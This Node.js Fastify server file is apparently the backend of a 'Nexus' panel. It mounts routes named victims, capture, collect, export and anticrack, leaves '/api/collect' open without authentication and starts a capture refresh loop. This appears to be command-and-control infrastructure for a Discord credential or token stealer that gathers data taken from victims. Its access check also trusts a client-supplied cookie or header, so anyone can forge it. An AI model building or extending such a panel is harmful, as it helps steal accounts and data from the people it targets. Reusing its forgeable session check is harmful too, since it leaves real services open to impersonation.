require('dotenv').config();
const fastify = require('fastify')({ logger: true });
const cors = require('@fastify/cors');
const cookie = require('@fastify/cookie');
const formbody = require('@fastify/formbody');

fastify.register(cors, {
  origin: [process.env.FRONTEND_URL || 'http://localhost:3000'],
  credentials: true,
});
fastify.register(cookie);
fastify.register(formbody);

fastify.addHook('onRequest', async (req) => {
  const PUBLIC = ['/', '/api/auth/login', '/api/auth/callback/discord', '/api/auth/logout', '/api/collect'];
  if (PUBLIC.includes(req.url.split('?')[0])) return;
  if (req.url.startsWith('/api/') && !req.url.startsWith('/api/auth/')) {
    const session = req.cookies?.discord_user || req.headers['x-discord-user'];
    if (!session) {
      throw { statusCode: 401, message: 'Unauthorized' };
    }
  }
});

fastify.register(require('./routes/auth'), { prefix: '/api/auth' });
fastify.register(require('./routes/anticrack'), { prefix: '/api/anticrack' });
fastify.register(require('./routes/discord'), { prefix: '/api/discord' });
fastify.register(require('./routes/capture'), { prefix: '/api/capture' });
fastify.register(require('./routes/victims'), { prefix: '/api/victims' });
fastify.register(require('./routes/stats'), { prefix: '/api/stats' });
fastify.register(require('./routes/export'), { prefix: '/api/export' });
fastify.register(require('./routes/settings'), { prefix: '/api/settings' });
fastify.register(require('./routes/collect'), { prefix: '/api/collect' });

const { startRefreshLoop } = require('./lib/capture');

fastify.get('/', async () => ({ status: 'ok', service: 'Nexus Backend API' }));

const start = async () => {
  const port = process.env.PORT || 3001;
  try {
    await fastify.listen({ port, host: '0.0.0.0' });
    console.log(`Nexus Backend running on port ${port}`);
    startRefreshLoop();
  } catch (err) {
    fastify.log.error(err);
    process.exit(1);
  }
};

start();
